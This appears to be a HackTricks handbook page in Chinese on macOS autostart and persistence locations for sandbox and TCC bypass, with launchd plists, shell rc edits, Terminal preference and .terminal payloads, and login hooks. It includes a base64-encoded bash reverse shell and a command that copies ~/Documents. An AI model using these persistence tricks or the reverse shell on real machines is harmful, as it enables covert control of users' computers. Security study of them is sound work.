<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>macOS Auto Start</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="macos-自动启动"><a class="header" href="#macos-自动启动">macOS 自动启动</a></h1>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<p>本节内容主要基于博客系列 <a href="https://theevilbit.github.io/beyond/"><strong>超越传统的 LaunchAgents</strong></a>，目标是添加 <strong>更多自动启动位置</strong>（如果可能），指明 <strong>哪些技术在最新版本的 macOS（13.4）中仍然有效</strong>，并指定所需的 <strong>权限</strong>。</p>
<h2 id="沙箱绕过"><a class="header" href="#沙箱绕过">沙箱绕过</a></h2>
<p>{% hint style="success" %}
在这里您可以找到对 <strong>沙箱绕过</strong> 有用的启动位置，它允许您通过 <strong>将其写入文件</strong> 并 <strong>等待</strong> 一个非常 <strong>常见</strong> 的 <strong>操作</strong>、特定的 <strong>时间</strong> 或您通常可以在沙箱内执行的 <strong>操作</strong> 来简单地执行某些内容，而无需根权限。
{% endhint %}</p>
<h3 id="launchd"><a class="header" href="#launchd">Launchd</a></h3>
<ul>
<li>有助于绕过沙箱：<a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>TCC 绕过：<a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="位置"><a class="header" href="#位置">位置</a></h4>
<ul>
<li><strong><code>/Library/LaunchAgents</code></strong></li>
<li><strong>触发</strong>：重启</li>
<li>需要根权限</li>
<li><strong><code>/Library/LaunchDaemons</code></strong></li>
<li><strong>触发</strong>：重启</li>
<li>需要根权限</li>
<li><strong><code>/System/Library/LaunchAgents</code></strong></li>
<li><strong>触发</strong>：重启</li>
<li>需要根权限</li>
<li><strong><code>/System/Library/LaunchDaemons</code></strong></li>
<li><strong>触发</strong>：重启</li>
<li>需要根权限</li>
<li><strong><code>~/Library/LaunchAgents</code></strong></li>
<li><strong>触发</strong>：重新登录</li>
<li><strong><code>~/Library/LaunchDemons</code></strong></li>
<li><strong>触发</strong>：重新登录</li>
</ul>
<p>{% hint style="success" %}
有趣的是，<strong><code>launchd</code></strong> 在 Mach-o 部分 <code>__Text.__config</code> 中嵌入了一个属性列表，其中包含其他知名服务，launchd 必须启动。此外，这些服务可以包含 <code>RequireSuccess</code>、<code>RequireRun</code> 和 <code>RebootOnSuccess</code>，这意味着它们必须运行并成功完成。</p>
<p>当然，由于代码签名，它无法被修改。
{% endhint %}</p>
<h4 id="描述与利用"><a class="header" href="#描述与利用">描述与利用</a></h4>
<p><strong><code>launchd</code></strong> 是 OX S 内核在启动时执行的 <strong>第一个</strong> <strong>进程</strong>，并且在关机时是最后一个完成的进程。它应该始终具有 <strong>PID 1</strong>。该进程将 <strong>读取并执行</strong> 在以下 <strong>ASEP</strong> <strong>plist</strong> 中指示的配置：</p>
<ul>
<li><code>/Library/LaunchAgents</code>：由管理员安装的每用户代理</li>
<li><code>/Library/LaunchDaemons</code>：由管理员安装的系统范围守护进程</li>
<li><code>/System/Library/LaunchAgents</code>：由 Apple 提供的每用户代理。</li>
<li><code>/System/Library/LaunchDaemons</code>：由 Apple 提供的系统范围守护进程。</li>
</ul>
<p>当用户登录时，位于 <code>/Users/$USER/Library/LaunchAgents</code> 和 <code>/Users/$USER/Library/LaunchDemons</code> 的 plist 将以 <strong>登录用户的权限</strong> 启动。</p>
<p><strong>代理和守护进程之间的主要区别在于，代理在用户登录时加载，而守护进程在系统启动时加载</strong>（因为有些服务如 ssh 需要在任何用户访问系统之前执行）。此外，代理可以使用 GUI，而守护进程需要在后台运行。</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;Label&lt;/key&gt;
&lt;string&gt;com.apple.someidentifier&lt;/string&gt;
&lt;key&gt;ProgramArguments&lt;/key&gt;
&lt;array&gt;
&lt;string&gt;bash -c 'touch /tmp/launched'&lt;/string&gt; &lt;!--Prog to execute--&gt;
&lt;/array&gt;
&lt;key&gt;RunAtLoad&lt;/key&gt;&lt;true/&gt; &lt;!--Execute at system startup--&gt;
&lt;key&gt;StartInterval&lt;/key&gt;
&lt;integer&gt;800&lt;/integer&gt; &lt;!--Execute each 800s--&gt;
&lt;key&gt;KeepAlive&lt;/key&gt;
&lt;dict&gt;
&lt;key&gt;SuccessfulExit&lt;/key&gt;&lt;/false&gt; &lt;!--Re-execute if exit unsuccessful--&gt;
&lt;!--If previous is true, then re-execute in successful exit--&gt;
&lt;/dict&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</code></pre>
<p>有些情况下，<strong>代理需要在用户登录之前执行</strong>，这些被称为<strong>PreLoginAgents</strong>。例如，这在登录时提供辅助技术是有用的。它们也可以在<code>/Library/LaunchAgents</code>中找到（请参见<a href="https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents"><strong>这里</strong></a>的示例）。</p>
<p>{% hint style="info" %}
新的守护进程或代理配置文件将在<strong>下次重启后或使用</strong> <code>launchctl load &lt;target.plist&gt;</code> <strong>加载</strong>。也可以使用<code>launchctl -F &lt;file&gt;</code> <strong>加载没有该扩展名的.plist文件</strong>（但是这些plist文件在重启后不会自动加载）。<br />
也可以使用<code>launchctl unload &lt;target.plist&gt;</code> <strong>卸载</strong>（指向的进程将被终止），</p>
<p>要<strong>确保</strong>没有<strong>任何</strong>（如覆盖）<strong>阻止</strong>代理或守护进程<strong>运行</strong>，请运行：<code>sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist</code>
{% endhint %}</p>
<p>列出当前用户加载的所有代理和守护进程：</p>
<pre><code class="language-bash">launchctl list
</code></pre>
<p>{% hint style="warning" %}
如果一个 plist 文件属于一个用户，即使它在守护进程的系统范围文件夹中，<strong>任务将以用户身份执行</strong>而不是以 root 身份执行。这可以防止某些特权升级攻击。
{% endhint %}</p>
<h4 id="关于-launchd-的更多信息"><a class="header" href="#关于-launchd-的更多信息">关于 launchd 的更多信息</a></h4>
<p><strong><code>launchd</code></strong> 是从 <strong>内核</strong> 启动的 <strong>第一个</strong> 用户模式进程。进程启动必须是 <strong>成功的</strong>，并且 <strong>不能退出或崩溃</strong>。它甚至对某些 <strong>杀死信号</strong> 进行了 <strong>保护</strong>。</p>
<p><code>launchd</code> 首先要做的事情之一是 <strong>启动</strong> 所有的 <strong>守护进程</strong>，例如：</p>
<ul>
<li>基于时间执行的 <strong>定时守护进程</strong>：</li>
<li>atd (<code>com.apple.atrun.plist</code>): 有一个 <code>StartInterval</code> 为 30 分钟</li>
<li>crond (<code>com.apple.systemstats.daily.plist</code>): 有 <code>StartCalendarInterval</code> 在 00:15 启动</li>
<li><strong>网络守护进程</strong>，例如：</li>
<li><code>org.cups.cups-lpd</code>: 在 TCP (<code>SockType: stream</code>) 上监听，<code>SockServiceName: printer</code></li>
<li>SockServiceName 必须是 <code>/etc/services</code> 中的端口或服务</li>
<li><code>com.apple.xscertd.plist</code>: 在 TCP 端口 1640 上监听</li>
<li><strong>路径守护进程</strong>，在指定路径更改时执行：</li>
<li><code>com.apple.postfix.master</code>: 检查路径 <code>/etc/postfix/aliases</code></li>
<li><strong>IOKit 通知守护进程</strong>：</li>
<li><code>com.apple.xartstorageremoted</code>: <code>"com.apple.iokit.matching" =&gt; { "com.apple.device-attach" =&gt; { "IOMatchLaunchStream" =&gt; 1 ...</code></li>
<li><strong>Mach 端口：</strong></li>
<li><code>com.apple.xscertd-helper.plist</code>: 在 <code>MachServices</code> 条目中指示名称 <code>com.apple.xscertd.helper</code></li>
<li><strong>UserEventAgent：</strong></li>
<li>这与之前的不同。它使 launchd 在响应特定事件时生成应用程序。然而，在这种情况下，涉及的主要二进制文件不是 <code>launchd</code>，而是 <code>/usr/libexec/UserEventAgent</code>。它从 SIP 受限文件夹 /System/Library/UserEventPlugins/ 加载插件，每个插件在 <code>XPCEventModuleInitializer</code> 键中指示其初始化程序，或者在旧插件的情况下，在其 <code>Info.plist</code> 的 <code>FB86416D-6164-2070-726F-70735C216EC0</code> 键下的 <code>CFPluginFactories</code> 字典中。</li>
</ul>
<h3 id="shell-启动文件"><a class="header" href="#shell-启动文件">shell 启动文件</a></h3>
<p>写作： <a href="https://theevilbit.github.io/beyond/beyond_0001/">https://theevilbit.github.io/beyond/beyond_0001/</a><br />
写作 (xterm)： <a href="https://theevilbit.github.io/beyond/beyond_0018/">https://theevilbit.github.io/beyond/beyond_0018/</a></p>
<ul>
<li>有助于绕过沙盒： <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>TCC 绕过： <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>但你需要找到一个具有 TCC 绕过的应用程序，该应用程序执行一个加载这些文件的 shell</li>
</ul>
<h4 id="位置-1"><a class="header" href="#位置-1">位置</a></h4>
<ul>
<li><strong><code>~/.zshrc</code>, <code>~/.zlogin</code>, <code>~/.zshenv.zwc</code></strong>, <strong><code>~/.zshenv</code>, <code>~/.zprofile</code></strong></li>
<li><strong>触发</strong>：打开一个 zsh 终端</li>
<li><strong><code>/etc/zshenv</code>, <code>/etc/zprofile</code>, <code>/etc/zshrc</code>, <code>/etc/zlogin</code></strong></li>
<li><strong>触发</strong>：打开一个 zsh 终端</li>
<li>需要 root 权限</li>
<li><strong><code>~/.zlogout</code></strong></li>
<li><strong>触发</strong>：退出一个 zsh 终端</li>
<li><strong><code>/etc/zlogout</code></strong></li>
<li><strong>触发</strong>：退出一个 zsh 终端</li>
<li>需要 root 权限</li>
<li>可能还有更多： <strong><code>man zsh</code></strong></li>
<li><strong><code>~/.bashrc</code></strong></li>
<li><strong>触发</strong>：打开一个 bash 终端</li>
<li><code>/etc/profile</code>（未生效）</li>
<li><code>~/.profile</code>（未生效）</li>
<li><code>~/.xinitrc</code>, <code>~/.xserverrc</code>, <code>/opt/X11/etc/X11/xinit/xinitrc.d/</code></li>
<li><strong>触发</strong>：预计在 xterm 中触发，但 <strong>未安装</strong>，即使安装后也会抛出此错误：xterm: <code>DISPLAY is not set</code></li>
</ul>
<h4 id="描述与利用-1"><a class="header" href="#描述与利用-1">描述与利用</a></h4>
<p>当启动一个 shell 环境，如 <code>zsh</code> 或 <code>bash</code> 时，<strong>会运行某些启动文件</strong>。macOS 当前使用 <code>/bin/zsh</code> 作为默认 shell。当启动终端应用程序或通过 SSH 访问设备时，自动访问此 shell。虽然 <code>bash</code> 和 <code>sh</code> 也存在于 macOS 中，但需要显式调用才能使用。</p>
<p>zsh 的手册页，我们可以通过 <strong><code>man zsh</code></strong> 阅读，详细描述了启动文件。</p>
<pre><code class="language-bash"># Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" &gt;&gt; ~/.zshrc
</code></pre>
<h3 id="重新打开的应用程序"><a class="header" href="#重新打开的应用程序">重新打开的应用程序</a></h3>
<p>{% hint style="danger" %}
配置所示的利用和注销再登录或甚至重启对我执行应用程序没有效果。 （应用程序没有被执行，也许在执行这些操作时需要它正在运行）
{% endhint %}</p>
<p><strong>写作</strong>: <a href="https://theevilbit.github.io/beyond/beyond_0021/">https://theevilbit.github.io/beyond/beyond_0021/</a></p>
<ul>
<li>有助于绕过沙盒: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>TCC 绕过: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="位置-2"><a class="header" href="#位置-2">位置</a></h4>
<ul>
<li><strong><code>~/Library/Preferences/ByHost/com.apple.loginwindow.&lt;UUID&gt;.plist</code></strong></li>
<li><strong>触发器</strong>: 重启重新打开应用程序</li>
</ul>
<h4 id="描述与利用-2"><a class="header" href="#描述与利用-2">描述与利用</a></h4>
<p>所有要重新打开的应用程序都在 plist <code>~/Library/Preferences/ByHost/com.apple.loginwindow.&lt;UUID&gt;.plist</code> 中</p>
<p>因此，要使重新打开的应用程序启动您自己的应用程序，您只需 <strong>将您的应用程序添加到列表中</strong>。</p>
<p>UUID 可以通过列出该目录或使用 <code>ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'</code> 找到</p>
<p>要检查将要重新打开的应用程序，您可以执行：</p>
<pre><code class="language-bash">defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.&lt;UUID&gt;.plist
</code></pre>
<p>要<strong>将应用程序添加到此列表</strong>，您可以使用：</p>
<pre><code class="language-bash"># Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.&lt;UUID&gt;.plist
</code></pre>
<h3 id="terminal-preferences"><a class="header" href="#terminal-preferences">Terminal Preferences</a></h3>
<ul>
<li>有助于绕过沙盒: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>TCC 绕过: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>终端使用用户的 FDA 权限</li>
</ul>
<h4 id="location"><a class="header" href="#location">Location</a></h4>
<ul>
<li><strong><code>~/Library/Preferences/com.apple.Terminal.plist</code></strong></li>
<li><strong>Trigger</strong>: 打开终端</li>
</ul>
<h4 id="description--exploitation"><a class="header" href="#description--exploitation">Description &amp; Exploitation</a></h4>
<p>在 <strong><code>~/Library/Preferences</code></strong> 中存储用户在应用程序中的偏好设置。这些偏好设置中的一些可以包含 <strong>执行其他应用程序/脚本</strong> 的配置。</p>
<p>例如，终端可以在启动时执行一个命令：</p>
<figure><img src="../.gitbook/assets/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>
<p>此配置在文件 <strong><code>~/Library/Preferences/com.apple.Terminal.plist</code></strong> 中反映如下:</p>
<pre><code class="language-bash">[...]
"Window Settings" =&gt; {
"Basic" =&gt; {
"CommandString" =&gt; "touch /tmp/terminal_pwn"
"Font" =&gt; {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" =&gt; 1
"FontWidthSpacing" =&gt; 1.004032258064516
"name" =&gt; "Basic"
"ProfileCurrentVersion" =&gt; 2.07
"RunCommandAsShell" =&gt; 0
"type" =&gt; "Window Settings"
}
[...]
</code></pre>
<p>所以，如果系统中终端的偏好设置的plist可以被覆盖，那么**<code>open</code><strong>功能可以用来</strong>打开终端并执行该命令**。</p>
<p>您可以通过cli添加此内容：</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash"># Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
</code></pre>
<p>{% endcode %}</p>
<h3 id="终端脚本--其他文件扩展名"><a class="header" href="#终端脚本--其他文件扩展名">终端脚本 / 其他文件扩展名</a></h3>
<ul>
<li>有助于绕过沙盒: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>TCC 绕过: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>终端使用用户的 FDA 权限</li>
</ul>
<h4 id="位置-3"><a class="header" href="#位置-3">位置</a></h4>
<ul>
<li><strong>任何地方</strong></li>
<li><strong>触发</strong>: 打开终端</li>
</ul>
<h4 id="描述与利用-3"><a class="header" href="#描述与利用-3">描述与利用</a></h4>
<p>如果你创建一个 <a href="https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx"><strong><code>.terminal</code></strong> 脚本</a> 并打开，<strong>终端应用程序</strong>将自动调用以执行其中指示的命令。如果终端应用程序具有某些特殊权限（例如 TCC），你的命令将以这些特殊权限运行。</p>
<p>尝试使用:</p>
<pre><code class="language-bash"># Prepare the payload
cat &gt; /tmp/test.terminal &lt;&lt; EOF
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;CommandString&lt;/key&gt;
&lt;string&gt;mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;&lt;/string&gt;
&lt;key&gt;ProfileCurrentVersion&lt;/key&gt;
&lt;real&gt;2.0600000000000001&lt;/real&gt;
&lt;key&gt;RunCommandAsShell&lt;/key&gt;
&lt;false/&gt;
&lt;key&gt;name&lt;/key&gt;
&lt;string&gt;exploit&lt;/string&gt;
&lt;key&gt;type&lt;/key&gt;
&lt;string&gt;Window Settings&lt;/string&gt;
&lt;/dict&gt;
&lt;/plist&gt;
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
&lt;string&gt;echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;&lt;/string&gt;
</code></pre>
<p>您还可以使用扩展名 <strong><code>.command</code></strong>、<strong><code>.tool</code></strong>，并包含常规 shell 脚本内容，它们也将由终端打开。</p>
<p>{% hint style="danger" %}
如果终端具有 <strong>完全磁盘访问权限</strong>，它将能够完成该操作（请注意，执行的命令将在终端窗口中可见）。
{% endhint %}</p>
<h3 id="音频插件"><a class="header" href="#音频插件">音频插件</a></h3>
<p>写作: <a href="https://theevilbit.github.io/beyond/beyond_0013/">https://theevilbit.github.io/beyond/beyond_0013/</a><br />
写作: <a href="https://posts.specterops.io/audio-unit-plug-ins-896d3434a882">https://posts.specterops.io/audio-unit-plug-ins-896d3434a882</a></p>
<ul>
<li>有助于绕过沙盒: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>TCC 绕过: <a href="https://emojipedia.org/large-orange-circle">🟠</a></li>
<li>您可能会获得一些额外的 TCC 访问权限</li>
</ul>
<h4 id="位置-4"><a class="header" href="#位置-4">位置</a></h4>
<ul>
<li><strong><code>/Library/Audio/Plug-Ins/HAL</code></strong></li>
<li>需要 root 权限</li>
<li><strong>触发</strong>: 重启 coreaudiod 或计算机</li>
<li><strong><code>/Library/Audio/Plug-ins/Components</code></strong></li>
<li>需要 root 权限</li>
<li><strong>触发</strong>: 重启 coreaudiod 或计算机</li>
<li><strong><code>~/Library/Audio/Plug-ins/Components</code></strong></li>
<li><strong>触发</strong>: 重启 coreaudiod 或计算机</li>
<li><strong><code>/System/Library/Components</code></strong></li>
<li>需要 root 权限</li>
<li><strong>触发</strong>: 重启 coreaudiod 或计算机</li>
</ul>
<h4 id="描述"><a class="header" href="#描述">描述</a></h4>
<p>根据之前的写作，可以 <strong>编译一些音频插件</strong> 并使其加载。</p>
<h3 id="quicklook-插件"><a class="header" href="#quicklook-插件">QuickLook 插件</a></h3>
<p>写作: <a href="https://theevilbit.github.io/beyond/beyond_0028/">https://theevilbit.github.io/beyond/beyond_0028/</a></p>
<ul>
<li>有助于绕过沙盒: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>TCC 绕过: <a href="https://emojipedia.org/large-orange-circle">🟠</a></li>
<li>您可能会获得一些额外的 TCC 访问权限</li>
</ul>
<h4 id="位置-5"><a class="header" href="#位置-5">位置</a></h4>
<ul>
<li><code>/System/Library/QuickLook</code></li>
<li><code>/Library/QuickLook</code></li>
<li><code>~/Library/QuickLook</code></li>
<li><code>/Applications/AppNameHere/Contents/Library/QuickLook/</code></li>
<li><code>~/Applications/AppNameHere/Contents/Library/QuickLook/</code></li>
</ul>
<h4 id="描述与利用-4"><a class="header" href="#描述与利用-4">描述与利用</a></h4>
<p>当您 <strong>触发文件的预览</strong>（在 Finder 中选择文件后按空格键）并且安装了 <strong>支持该文件类型的插件</strong> 时，可以执行 QuickLook 插件。</p>
<p>可以编译您自己的 QuickLook 插件，将其放置在上述位置之一以加载，然后转到支持的文件并按空格键以触发它。</p>
<h3 id="登录注销钩子"><a class="header" href="#登录注销钩子"><del>登录/注销钩子</del></a></h3>
<p>{% hint style="danger" %}
这对我不起作用，无论是用户 LoginHook 还是 root LogoutHook
{% endhint %}</p>
<p><strong>写作</strong>: <a href="https://theevilbit.github.io/beyond/beyond_0022/">https://theevilbit.github.io/beyond/beyond_0022/</a></p>
<ul>
<li>有助于绕过沙盒: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>TCC 绕过: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="位置-6"><a class="header" href="#位置-6">位置</a></h4>
<ul>
<li>您需要能够执行类似 <code>defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh</code> 的命令</li>
<li>位于 <code>~/Library/Preferences/com.apple.loginwindow.plist</code></li>
</ul>
<p>它们已被弃用，但可以在用户登录时执行命令。</p>
<pre><code class="language-bash">cat &gt; $HOME/hook.sh &lt;&lt; EOF
#!/bin/bash
echo 'My is: \`id\`' &gt; /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
</code></pre>
<p>此设置存储在 <code>/Users/$USER/Library/Preferences/com.apple.loginwindow.plist</code></p>
<pre><code class="language-bash">defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
</code></pre>
<p>要删除它：</p>
<pre><code class="language-bash">defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
</code></pre>
<p>The root user one is stored in <strong><code>/private/var/root/Library/Preferences/com.apple.loginwindow.plist</code></strong></p>
<h2 id="条件沙箱绕过"><a class="header" href="#条件沙箱绕过">条件沙箱绕过</a></h2>
<p>{% hint style="success" %}
在这里您可以找到对<strong>沙箱绕过</strong>有用的启动位置，这允许您通过<strong>将其写入文件</strong>并<strong>期望不太常见的条件</strong>（如特定的<strong>已安装程序</strong>、"不常见"用户<strong>操作</strong>或环境）来简单地执行某些操作。
{% endhint %}</p>
<h3 id="cron"><a class="header" href="#cron">Cron</a></h3>
<p><strong>写作</strong>: <a href="https://theevilbit.github.io/beyond/beyond_0004/">https://theevilbit.github.io/beyond/beyond_0004/</a></p>
<ul>
<li>有助于绕过沙箱: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>但是，您需要能够执行<code>crontab</code>二进制文件</li>
<li>或者是root</li>
<li>TCC绕过: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="位置-7"><a class="header" href="#位置-7">位置</a></h4>
<ul>
